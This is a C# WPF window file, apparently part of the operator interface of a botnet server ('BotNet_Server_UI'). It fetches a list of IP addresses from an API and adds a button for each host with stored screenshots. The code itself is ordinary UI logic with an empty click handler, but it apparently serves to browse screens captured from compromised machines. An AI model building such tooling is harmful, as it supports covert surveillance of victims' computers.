﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace BotNet_Server_UI
{
    /// <summary>
    /// Логика взаимодействия для Screens.xaml
    /// </summary>
    public partial class Screens : Window
    {
        public Screens()
        {
            InitializeComponent();
        }

        private async void ScrForm_Loaded(object sender, RoutedEventArgs e)
        {
            List<Button> buttons = new List<Button>();
            List<IP> ip = new List<IP>();
            IP[] arr = await ApiRequest.GetProductAsync<IP[]>("/api/v1/ip");
            for (int j = 0; j < arr.Length; j++)
            {
                if (arr[j].ip == "")
                {
                    continue;
                }
                else if (await ApiRequest.GetProductAsync<Screen>("/api/v1/screens/" + arr[j].id) == default(Screen))
                {
                    continue;
                }
                ip.Add(arr[j]);
            }
            for (int i = 0; i < ip.Count; i++)
            {
                buttons.Add(new Button()
                {
                    Content = "Скриншоты " + ip[i].ip
                });
                buttons[i].Click += Screens_Click;
                ListScrenns.Items.Add(buttons[i]);
            }
        }

        private void Screens_Click(object sender, RoutedEventArgs e)
        {

        }
    }
}
